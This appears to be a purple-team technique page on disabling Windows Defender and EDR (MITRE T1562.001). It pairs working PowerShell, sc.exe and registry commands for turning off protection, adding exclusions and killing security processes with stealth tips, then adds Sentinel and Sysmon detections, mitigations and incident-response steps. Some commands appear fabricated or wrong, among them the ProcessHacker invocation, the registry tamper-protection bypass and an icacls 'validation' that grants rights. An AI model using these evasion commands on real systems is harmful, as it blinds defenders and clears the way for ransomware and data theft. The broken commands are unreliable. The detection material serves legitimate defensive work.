# [EVADE-IMPAIR-001]: Disable Security Tools (AV/EDR)

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-IMPAIR-001 |
| **MITRE ATT&CK v18.1** | [T1562.001 - Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Windows Endpoint |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2016, Server 2019, Server 2022, Server 2025; Windows 10/11 all versions |
| **Patched In** | Partial mitigations in Windows Defender v4.18.2301+; EDR solutions implement real-time process protection |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Disabling antivirus (AV) and Endpoint Detection & Response (EDR) tools is a fundamental defense evasion technique that allows adversaries to execute arbitrary code, deploy malware, and maintain persistence without triggering security alerts. This involves either stopping security services (e.g., Windows Defender), modifying registry keys to disable functionality, or leveraging built-in Windows utilities like `sc.exe` and PowerShell to suppress real-time monitoring. The technique exploits the fact that most organizations rely on these tools as their primary detection mechanism.

**Attack Surface:** The Windows security subsystem, service management infrastructure, registry hive (`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services`), and PowerShell runtime.

**Business Impact:** **Undetected Post-Compromise Activity.** Disabling AV/EDR allows adversaries to execute ransomware, data exfiltration tools, lateral movement payloads, and persistence mechanisms without triggering automated responses. Organizations lose visibility into the attack, extending dwell time and increasing the scope of compromise.

**Technical Context:** On modern Windows systems with real-time monitoring, disabling AV typically triggers EventID 5001 (Real-Time Protection Disabled) and 5007 (Configuration Changed). However, if executed before adequate logging is in place, evidence can be minimal. EDR solutions are more resilient due to kernel-level hooks and code integrity checks, but service stop commands can still succeed if the EDR lacks proper process protection.

### Operational Risk

- **Execution Risk:** Medium (Requires local or elevated privileges; many methods now require admin rights due to UAC/PPL protections).
- **Stealth:** Medium-High (Generates security events, but adversaries often run these commands after initial compromise when monitoring may be delayed).
- **Reversibility:** Yes (Services can be re-enabled, but forensic artifacts remain in logs).

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 9.1.1, 9.4 | Ensure Antivirus software is present and active; Ensure real-time scanning is enabled. |
| **DISA STIG** | WN10-00-000050, WN10-00-000051 | Ensure Windows Defender is enabled and real-time monitoring is active. |
| **CISA SCuBA** | SC.L1.1 | Require multi-layered defense; disable or modify tools violates defense-in-depth. |
| **NIST 800-53** | SI-3 (Malicious Code Protection) | Implements AV and monitors/manages the effects of malicious code. |
| **GDPR** | Art. 32 | Security of Processing; Measures must ensure ongoing ability to ensure confidentiality, integrity, availability. |
| **DORA** | Art. 9 | Protection and Prevention (ICT); Incident detection and response. |
| **NIS2** | Art. 21 | Cyber Risk Management Measures; Monitoring and detection capabilities required. |
| **ISO 27001** | A.12.6.1, A.12.2.1 | Management of technical vulnerabilities; Detection and prevention. |
| **ISO 27005** | Risk Scenario | Compromise due to disabled defenses; Increased probability and impact. |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Local Administrator or SYSTEM; some methods (e.g., Set-MpPreference) work with standard user if UAC is disabled; EDR disabling typically requires admin.
- **Required Access:** Local console access or remote code execution (RCE) on the endpoint.

**Supported Versions:**

- **Windows:** Server 2016, Server 2019, Server 2022, Server 2025, Windows 10 (all builds), Windows 11 (all builds)
- **PowerShell:** Version 2.0+ (5.0 recommended for modern cmdlets)
- **EDR:** Varies by vendor (Microsoft Defender, CrowdStrike, SentinelOne, etc.); technique viability depends on kernel protection level

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### PowerShell Reconnaissance

```powershell
# Check if Windows Defender is running
Get-Service WinDefend | Select-Object Name, Status, StartType

# Check Defender preferences and exclusions
Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableIOAVProtection, ExclusionPath

# Check if Defender is tamper-protected
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows Defender" | Select-Object *tamper*

# Enumerate running EDR/AV processes
Get-Process | Where-Object {$_.ProcessName -match "(MsMpEng|falconCertificateModule|xagt|PEP)" }

# Check registry for Defender service startup type
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" -Name Start
```

**What to Look For:**

- **WinDefend Status:** If `Running`, the service is active. If `Stopped`, it may already be disabled.
- **DisableRealtimeMonitoring:** Value of `0` means enabled; `1` means disabled.
- **EDR Processes:** Presence indicates EDR is active; absence suggests it may not be installed.
- **Start Value:** `2` = Auto (boots with OS); `4` = Disabled; `3` = Manual.

**Version Note:** Windows Server 2022+ has enhanced Defender with tamper protection by default; requires admin to disable.

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: PowerShell Set-MpPreference (Disable Real-Time Monitoring)

**Supported Versions:** Windows Server 2016-2025, Windows 10/11

#### Step 1: Disable Real-Time Monitoring via PowerShell Cmdlet

**Objective:** Disable Windows Defender real-time protection without stopping the service (less noisy than service stop).

**Command:**

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

**Variant (Disable Multiple Protection Components):**

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true
```

**Expected Output:**

```
(No output on success; command completes silently)
```

**What This Means:**

- Real-time scanning is now disabled; malware can execute without triggering heuristic analysis.
- IOAV (on-demand access vector) protection is disabled; file access scanning is halted.
- Behavior monitoring is disabled; AMSI/behavioral heuristics bypassed.

**OpSec & Evasion:**

- This generates EventID 5001 (Real-Time Protection Disabled) in the Security log.
- If run from a compromised service or scheduled task, attribution becomes difficult.
- Does **not** stop the WinDefend service, so quick visual inspection shows Defender "running."

**Troubleshooting:**

- **Error:** "Access denied" or "Set-MpPreference is not recognized"
  - **Cause:** Not running as Administrator.
  - **Fix:** Run `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-MpPreference ..."`from elevated context.

**References:**

- [Microsoft: Set-MpPreference](https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference)
- [Red Canary: Disable or Modify Tools](https://redcanary.com/threat-detection-report/techniques/disable-or-modify-tools/)

---

#### Step 2: Add Exclusions to Bypass Scanning

**Objective:** Prevent scanning of specific file paths/processes where malware will reside.

**Command:**

```powershell
Add-MpPreference -ExclusionPath "C:\Temp", "C:\Windows\Temp"
Add-MpPreference -ExclusionProcess "notepad.exe", "svchost.exe"
```

**Expected Output:**

```
(No output on success)
```

**What This Means:**

- Files in excluded paths will **not** be scanned by Windows Defender.
- Processes in excluded list will **not** trigger Defender alerts.

**OpSec & Evasion:**

- Exclusion additions generate EventID 5007 (Configuration Changed) but may blend with legitimate IT operations.
- Using legitimate process names (notepad.exe, svchost.exe) for exclusion obscures intent.

**References:**

- [Microsoft: Add-MpPreference](https://learn.microsoft.com/en-us/powershell/module/defender/add-mppreference)

---

### METHOD 2: Service Stop via sc.exe / Stop-Service

**Supported Versions:** Windows Server 2016-2025, Windows 10/11

#### Step 1: Stop the WinDefend Service

**Objective:** Halt the Windows Defender service entirely, preventing all protection features.

**Command (sc.exe):**

```cmd
sc stop WinDefend
```

**Command (PowerShell):**

```powershell
Stop-Service -Name WinDefend -Force
```

**Expected Output (sc.exe):**

```
[SC] StopService SUCCESS
```

**Expected Output (PowerShell):**

```
(No output on success)
```

**What This Means:**

- The WinDefend service is stopped; Windows Defender no longer monitors the system.
- Real-time protection, scheduled scans, and AMSI integration are halted.

**OpSec & Evasion:**

- Generates EventID 7034 (Service unexpectedly terminated) or 7035 (Service stop command initiated).
- If executed post-compromise, these events may not be forwarded immediately to a SIEM.
- Use `/Force` to prevent Defender from auto-restarting.

**Troubleshooting:**

- **Error:** "Access denied"
  - **Cause:** Not running as Administrator; Windows Server 2022+ has tamper protection.
  - **Fix (Server 2016-2019):** Run from elevated command prompt.
  - **Fix (Server 2022+):** Disable tamper protection first (requires admin + registry modification).

**References:**

- [Microsoft: Stop-Service](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/stop-service)

---

#### Step 2: Disable Service Auto-Start (Prevent Restart on Reboot)

**Objective:** Ensure Defender remains disabled even after system restart.

**Command (sc.exe):**

```cmd
sc config WinDefend start=disabled
```

**Command (PowerShell):**

```powershell
Set-Service -Name WinDefend -StartupType Disabled
```

**Expected Output:**

```
[SC] ChangeServiceConfig SUCCESS
```

**What This Means:**

- The WinDefend service will **not** auto-start on next reboot.
- Requires explicit re-enablement to restore protection.

**OpSec & Evasion:**

- Registry modification is logged (EventID 4657: Registry value modified).

**References:**

- [Windows Registry: Services Configuration](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config)

---

### METHOD 3: Registry Modification (Tamper Protection Bypass for Server 2022+)

**Supported Versions:** Windows Server 2022+, Windows 11

#### Step 1: Disable Tamper Protection via Registry

**Objective:** On newer Windows versions, tamper protection locks the registry. This step disables it.

**Command (PowerShell):**

```powershell
$path = "HKLM:\Software\Microsoft\Windows Defender\Features"
New-Item -Path $path -Force | Out-Null
Set-ItemProperty -Path $path -Name "TamperProtection" -Value 0
```

**Expected Output:**

```
(No output on success)
```

**What This Means:**

- Tamper protection is now disabled; registry edits to Defender can proceed.

**OpSec & Evasion:**

- This modification is logged as EventID 4657; however, disabling tamper protection may disable certain logging.

**References:**

- [Microsoft: Tamper Protection Registry](https://learn.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/prevent-changes-to-security-settings-with-tamper-protection)

---

#### Step 2: Disable Defender via Registry

**Objective:** After tamper protection is disabled, modify the registry to disable Defender entirely.

**Command (PowerShell):**

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1
```

**Expected Output:**

```
(No output on success)
```

**What This Means:**

- Defender is disabled at the registry level; even service restart will not re-enable it.

**References:**

- [Microsoft: Windows Defender Registry Settings](https://learn.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/configure-local-policy-overrides-microsoft-defender-antivirus)

---

### METHOD 4: EDR Disabling (Example: ProcessHacker / GMER)

**Supported Versions:** Windows Server 2016-2022, Windows 10/11

#### Step 1: Execute EDR Disable Tool

**Objective:** Some EDR solutions can be disabled using third-party drivers (ProcessHacker, GMER, IOBit) that lower integrity levels or hook functions.

**Command (Example using ProcessHacker driver):**

```powershell
# Download and execute ProcessHacker
Invoke-WebRequest -Uri "https://processhacker.sourceforge.io/processhacker2.exe" -OutFile "C:\Temp\ph.exe"

# Run with driver to disable EDR process
C:\Temp\ph.exe -object process -object name "MsMpEng.exe" -action terminate
```

**Expected Output:**

```
(Depends on tool; typically shows terminated process)
```

**What This Means:**

- The EDR service (e.g., MsMpEng.exe for Defender) is forcefully terminated.
- Kernel-mode hooks are potentially bypassed.

**OpSec & Evasion:**

- **High Risk:** Kernel driver injection triggers kernel logging (ETW Kernel Trace).
- Modern EDR implements Protected Process Light (PPL); processes cannot be directly terminated.

**Troubleshooting:**

- **Error:** "Access denied" or "Process still running"
  - **Cause:** EDR has kernel protection; PPL prevents termination.
  - **Fix:** Requires exploitation of kernel vulnerability (e.g., CVE-2025-29824) or privilege escalation to Kernel.

**References:**

- [CISA: How 12 Ransomware Gangs Bypass EDR](https://lumu.io/blog/cisa-reveals-ransomware-gangs-bypassing-edrs/)
- [ProcessHacker GitHub](https://github.com/ProcessHacker/ProcessHacker)

---

## 5. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team Tests

**Test ID:** T1562.001 (Multiple variants)

**Supported Tests:**

1. **Test: Disable Windows Defender Real-Time Monitoring (PowerShell)**
   - **Command:**
     ```powershell
     Invoke-AtomicTest T1562.001 -TestNumbers 1
     ```
   - **Cleanup:**
     ```powershell
     Invoke-AtomicTest T1562.001 -TestNumbers 1 -Cleanup
     ```

2. **Test: Disable Windows Defender via sc.exe**
   - **Command:**
     ```powershell
     Invoke-AtomicTest T1562.001 -TestNumbers 2
     ```

3. **Test: Stop Windows Defender via PowerShell**
   - **Command:**
     ```powershell
     Invoke-AtomicTest T1562.001 -TestNumbers 3
     ```

**Reference:** [Atomic Red Team Library - T1562.001](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md)

---

## 6. TOOLS & COMMANDS REFERENCE

### Windows Built-In Tools

#### sc.exe (Service Control)

**Version:** All Windows versions
**Usage:**
```cmd
sc stop WinDefend
sc config WinDefend start=disabled
```

**References:**

- [Microsoft Docs: sc command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config)

---

#### PowerShell Cmdlets

**Version:** PowerShell 5.0+
**Tools:**
- `Stop-Service`
- `Set-MpPreference`
- `Add-MpPreference`
- `Set-Service`

**Usage:**
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

**References:**

- [Microsoft Docs: Set-MpPreference](https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference)

---

### Third-Party EDR Disabling Tools

#### ProcessHacker

**Version:** 2.x+
**Purpose:** Terminate EDR processes, bypass kernel protections via driver.
**Download:** [ProcessHacker GitHub](https://github.com/ProcessHacker/ProcessHacker)

#### GMER

**Version:** 2.x+
**Purpose:** Anti-rootkit tool; can interact with kernel to disable monitoring.
**Download:** [GMER Website](http://www.gmer.net/)

#### IOBit Uninstaller / Advanced SystemCare

**Version:** 12.x+
**Purpose:** Utility-based approach; uninstalls AV/EDR software.
**Note:** Legitimate software sometimes misused for malicious purposes.

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Windows Defender Real-Time Monitoring Disabled

**Rule Configuration:**

- **Required Table:** DeviceProcessEvents, DeviceRegistryEvents
- **Required Fields:** ProcessName, CommandLine, RegistryKey, RegistryValue
- **Alert Severity:** High
- **Frequency:** Every 5 minutes
- **Applies To:** Windows 10/11, Server 2016+

**KQL Query:**

```kusto
// Detect Set-MpPreference disabling real-time monitoring
DeviceProcessEvents
| where ProcessName contains "powershell.exe"
| where CommandLine contains "Set-MpPreference" 
    and CommandLine contains "DisableRealtimeMonitoring" 
    and CommandLine contains "$true"
| project TimeGenerated, DeviceName, ProcessName, CommandLine, AccountName
```

**What This Detects:**

- PowerShell invocation of `Set-MpPreference` with parameters that disable real-time scanning.
- Line 3-5: Filters for PowerShell process.
- Line 6: Matches the specific cmdlet and parameters.

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Defender Real-Time Monitoring Disabled`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**

```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

$query = @"
DeviceProcessEvents
| where ProcessName contains "powershell.exe"
| where CommandLine contains "Set-MpPreference" 
| where CommandLine contains "DisableRealtimeMonitoring"
| where CommandLine contains "`$true"
"@

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Defender Real-Time Monitoring Disabled" `
  -Query $query `
  -Severity "High" `
  -Enabled $true
```

**References:**

- [Microsoft Sentinel: Scheduled Query Rules](https://learn.microsoft.com/en-us/azure/sentinel/detect-threats-custom)

---

#### Query 2: Windows Defender Service Stopped

**Rule Configuration:**

- **Required Table:** SecurityEvent
- **Required Fields:** EventID, ProcessName, CommandLine
- **Alert Severity:** Critical
- **Frequency:** Real-time (every 1 minute)

**KQL Query:**

```kusto
// Detect sc.exe or PowerShell stopping WinDefend service
SecurityEvent
| where EventID == 4688  // Process Creation
| where ProcessName contains "sc.exe" or ProcessName contains "powershell.exe"
| where CommandLine contains "stop" and CommandLine contains "WinDefend"
| project TimeGenerated, Computer, ProcessName, CommandLine, Account
```

**What This Detects:**

- EventID 4688: Process creation events.
- Matches `sc.exe` or `powershell.exe` with "stop" and "WinDefend" in command line.

**References:**

- [Microsoft: EventID 4688](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688)

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 5001 (Real-Time Protection Disabled)**

- **Log Source:** Microsoft-Windows-Windows Defender/Operational
- **Trigger:** Real-time monitoring component is disabled.
- **Filter:** Provider_Name = "Microsoft-Windows-Windows Defender"; EventID = 5001
- **Applies To Versions:** All Windows versions with Defender

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Security System Extension** → **Success and Failure**
4. Run `gpupdate /force` on target machines

**Manual Configuration Steps (Local Policy):**

1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **System**
3. Enable: **Audit Security System Extension**
4. Run `auditpol /set /subcategory:"Security System Extension" /success:enable /failure:enable`

---

**Event ID: 7034 (Service Unexpectedly Terminated)**

- **Log Source:** System
- **Trigger:** WinDefend service stops unexpectedly.
- **Filter:** Source = "Service Control Manager"; EventID = 7034; ServiceName = "WinDefend"

---

**Event ID: 4657 (Registry Value Modified)**

- **Log Source:** Security
- **Trigger:** Registry keys related to Defender are modified.
- **Filter:** EventID = 4657; ObjectName contains "HKLM\Software\Microsoft\Windows Defender"

**Manual Configuration (Audit Registry):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Object Access**
3. Enable: **Audit Registry**
4. Specify registry paths in SACL (Security ACL) for monitoring:
   ```
   HKLM\Software\Microsoft\Windows Defender\Features
   HKLM\SYSTEM\CurrentControlSet\Services\WinDefend
   ```

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 11.0+
**Supported Platforms:** Windows 10/11, Server 2016-2025

```xml
<Rule name="Defender Disabled via PowerShell" groupRelation="or">
  <ProcessCreate onmatch="all">
    <Image condition="contains">powershell.exe</Image>
    <CommandLine condition="contains all">Set-MpPreference; DisableRealtimeMonitoring</CommandLine>
  </ProcessCreate>
</Rule>

<Rule name="WinDefend Service Stopped" groupRelation="or">
  <ProcessCreate onmatch="all">
    <Image condition="endswith">sc.exe</Image>
    <CommandLine condition="contains all">stop; WinDefend</CommandLine>
  </ProcessCreate>
</Rule>

<Rule name="Registry Modification - Windows Defender" groupRelation="or">
  <RegistryEvent onmatch="all">
    <TargetObject condition="contains">HKLM\Software\Microsoft\Windows Defender</TargetObject>
    <EventType>SetValue</EventType>
  </RegistryEvent>
</Rule>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-config.xml` with the XML above
3. Install Sysmon:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify:
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious security tool disabled on a virtual machine"

- **Severity:** High
- **Description:** Defender for Cloud detects when Defender or other security services are disabled via `sc.exe`, PowerShell, or registry.
- **Applies To:** All Azure VMs with Defender agent
- **Remediation:** Immediate alert triggers; VM isolation recommended; check for subsequent lateral movement.

**Manual Configuration Steps (Enable Defender for Cloud):**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Endpoint Integration**: ON (if using MDE)
5. Click **Save**
6. Go to **Security alerts** to view detected incidents

**Reference:** [Microsoft Defender for Cloud - Suspicious Tool Disabled](https://learn.microsoft.com/en-us/azure/security-center/)

---

## 11. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

**1. Enable Tamper Protection (Server 2022+ / Windows 11)**

- **Objective:** Prevent disabling of Windows Defender via registry/service manipulation.
- **Applies To Versions:** Windows Server 2022+, Windows 11 (build 22000+)

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Administrative Templates** → **Windows Components** → **Windows Defender Antivirus**
3. Find policy: **"Enable Tamper Protection"**
4. Set to: **Enabled**
5. Run `gpupdate /force`

**Manual Steps (PowerShell):**

```powershell
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows Defender" `
  -Name "TamperProtectionConfiguration" -Value 2
# Value 2 = Enabled; 0 = Disabled
```

**Manual Steps (Registry):**

```cmd
reg add "HKLM\Software\Microsoft\Windows Defender" /v "TamperProtectionConfiguration" /t REG_DWORD /d 2 /f
```

---

**2. Restrict Administrative Rights and Implement Least Privilege**

- **Objective:** Limit the number of users who can execute `sc.exe`, PowerShell, or modify registry.
- **Applies To Versions:** All Windows versions

**Manual Steps (Group Policy - PowerShell Execution):**

1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Administrative Templates** → **PowerShell Core**
3. Find policy: **"Turn on PowerShell Script Block Logging"**
4. Set to: **Enabled**
5. Alternatively, use **AppLocker** to restrict PowerShell execution to specific accounts:
   - **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Application Control Policies** → **AppLocker**
   - Create rule: Allow PowerShell only for SYSTEM and Domain Admins

---

**3. Enable Audit Logging for Service Changes**

- **Objective:** Log all attempts to modify or stop security services.
- **Applies To Versions:** All Windows versions

**Manual Steps (Group Policy):**

1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System**
3. Enable: **Audit Security System Extension** (Success and Failure)
4. Run `gpupdate /force`

**Manual Steps (Local Policy):**

```powershell
auditpol /set /subcategory:"Security System Extension" /success:enable /failure:enable
auditpol /set /subcategory:"Registry" /success:enable /failure:enable
```

---

#### Priority 2: HIGH

**4. Implement Real-Time Detection and Response (EDR)**

- **Objective:** Deploy EDR solution with kernel-level protection to prevent AV/EDR disabling.
- **Examples:** Microsoft Defender for Endpoint (MDE), CrowdStrike, SentinelOne, Elastic Detection Engine.
- **Manual Steps (Enable MDE on Windows Devices):**
  1. Go to **Azure Portal** → **Microsoft Defender for Cloud**
  2. Under **Environment settings**, enable **Defender for Servers**
  3. Install **Microsoft Defender for Endpoint** agent on machines:
     ```powershell
     # Download and install MDE client
     Invoke-WebRequest -Uri "https://aka.ms/mdatpanalytics" -OutFile "mdatpclient.msi"
     msiexec.exe /i mdatpclient.msi /quiet
     ```

---

**5. Centralized Log Forwarding (Prevent Log Clearing)**

- **Objective:** Forward logs to remote SIEM so local log clearing doesn't eliminate forensic evidence.
- **Manual Steps (Configure Windows Log Forwarding):**
  1. Open **Event Viewer** on a domain-joined machine
  2. Right-click **Windows Logs** → **Configure Forwarded Events**
  3. Configure to forward to SIEM (Splunk, Sentinel, ELK)
  4. Use **Group Policy** to enforce this:
     - **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Event Forwarding**
     - Enable: **Configure forwarder resource usage**

---

#### Access Control & Policy Hardening

**6. Conditional Access - Require Device Compliance**

**Manual Steps (Azure Conditional Access):**

1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Name: `Block Non-Compliant Devices`
4. **Assignments:**
   - Users: **All users**
   - Cloud apps: **All cloud apps** (or specific sensitive apps)
   - Conditions: **Device state** = Non-compliant
5. **Access controls:**
   - Grant: **Block access**
6. Enable policy: **On**
7. Click **Create**

**7. RBAC Role Assignment Review**

**Manual Steps (Azure Portal):**

1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators**
2. Search for: **Global Administrator**
3. Click **Members** and review assignments
4. Remove unnecessary users: Select user → **Remove assignment**
5. Prefer **Security Administrator** or **Endpoint Security Manager** roles for AV/EDR management

---

#### Validation Command (Verify Mitigations)

```powershell
# Check Tamper Protection is enabled
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows Defender" | Select-Object TamperProtectionConfiguration

# Check Audit Logging
auditpol /get /category:"System"

# Check Service Permissions
icacls "C:\Windows\System32\sc.exe" /grant:r "Domain Admins:(F)"

# Verify Defender is running and protected
Get-Service WinDefend | Select-Object Status, StartType
Get-MpPreference | Select-Object DisableRealtimeMonitoring
```

**Expected Output (If Secure):**

```
TamperProtectionConfiguration : 2  (Enabled)
Status                         : Running
DisableRealtimeMonitoring      : False
```

---

## 12. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

- **Files:** N/A (technique doesn't create files; depends on execution method)
- **Registry:** 
  - `HKLM\Software\Microsoft\Windows Defender` (DisableAntiSpyware, TamperProtectionConfiguration)
  - `HKLM\SYSTEM\CurrentControlSet\Services\WinDefend` (Start value = 4 = Disabled)
  - `HKLM\Software\Policies\Microsoft\Windows Defender` (policy overrides)
- **Network:** N/A
- **Process:** `powershell.exe`, `sc.exe`, `regedit.exe`, `mpcmdrun.exe`

#### Forensic Artifacts

- **Disk:** Event logs in `C:\Windows\System32\winevt\Logs\Security.evtx`, `Microsoft-Windows-Windows Defender/Operational`
- **Memory:** Service control commands in process memory; PowerShell command history in memory
- **Cloud:** Defender for Cloud alerts; Sentinel logs (SecurityEvent table with EventID 4688, 5001)
- **MFT/USN Journal:** Registry hive modifications (C:\Windows\System32\config\SOFTWARE)

#### Response Procedures

1. **Isolate:**
   **Command:**
   ```powershell
   # Disconnect network adapter
   Disable-NetAdapter -Name "Ethernet" -Confirm:$false
   ```
   **Manual (Azure):**
   - Go to **Azure Portal** → **Virtual Machines** → Select VM → **Networking** → Click NIC → **Disable**

2. **Collect Evidence:**
   **Command:**
   ```powershell
   # Export Security Event Log
   wevtutil epl Security C:\Evidence\Security.evtx
   
   # Export Defender Operational Log
   wevtutil epl Microsoft-Windows-Windows Defender/Operational C:\Evidence\Defender.evtx
   
   # Capture memory dump (requires procdump)
   procdump64.exe -ma svchost.exe C:\Evidence\svchost.dmp
   ```
   **Manual:**
   - Open **Event Viewer** → **Windows Logs** → **Security** → Right-click → **Save All Events As** → `C:\Evidence\Security.evtx`

3. **Remediate:**
   **Command:**
   ```powershell
   # Re-enable WinDefend service
   Set-Service -Name WinDefend -StartupType Automatic -Status Running
   
   # Re-enable Defender real-time monitoring
   Set-MpPreference -DisableRealtimeMonitoring $false
   
   # Run Defender scan
   Start-MpScan -ScanType FullScan
   ```
   **Manual:**
   - Open **Services** (services.msc) → Right-click **Windows Defender Service** → **Properties** → Set **Startup Type** to **Automatic** → Click **Start**

4. **Investigate:**
   - Check for additional lateral movement commands post-disable (Event ID 4688 process creation)
   - Review PowerShell history (`C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`)
   - Check for ransomware/malware execution in the time window when Defender was disabled

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker gains initial user-level access via phishing. |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-001] PrintNightmare RCE | Attacker exploits CVE-2021-34527 to gain admin rights. |
| **3** | **Defense Evasion** | **[EVADE-IMPAIR-001]** | **Attacker disables Defender to avoid detection.** |
| **4** | **Execution** | [CA-DUMP-001] Mimikatz LSASS Dump | Attacker extracts credentials from memory. |
| **5** | **Impact** | [DATA-EXF-001] Data Exfiltration | Attacker exfiltrates sensitive data undetected. |

---

## 14. REAL-WORLD EXAMPLES

#### Example 1: RansomHub (2024)

- **Target:** U.S. Healthcare Organizations
- **Timeline:** September 2024 - Present
- **Technique Status:** RansomHub uses EDRKillShifter tool to disable EDR/AV before deploying ransomware.
- **Impact:** Ransomware deployments succeeded without triggering alerts; organizations had no visibility of lateral movement.
- **Reference:** [CISA Alert - RansomHub](https://www.cisa.gov/)

---

#### Example 2: Wizard Spider / TrickBot (2020-2023)

- **Target:** Financial Institutions, Healthcare
- **Timeline:** 2020-2023
- **Technique Status:** Wizard Spider used `sc.exe` commands and PowerShell to disable Windows Defender, antivirus, and Windows Update before deploying Ryuk ransomware.
- **Impact:** Dwell time extended 8+ months; widespread lateral movement and data exfiltration.
- **Reference:** [IBM X-Force: Wizard Spider](https://securityintelligence.com/)

---

#### Example 3: Ember Bear / Cadet Blizzard (2022)

- **Target:** Ukrainian Critical Infrastructure
- **Timeline:** 2022 (Ongoing)
- **Technique Status:** Used NirSoft AdvancedRun utility to disable Microsoft Defender via service stop and registry modification.
- **Impact:** Deployed HermeticWiper malware undetected; destructive attack caused major operational disruption.
- **Reference:** [CrowdStrike: Ember Bear / Cadet Blizzard](https://www.crowdstrike.com/)

---
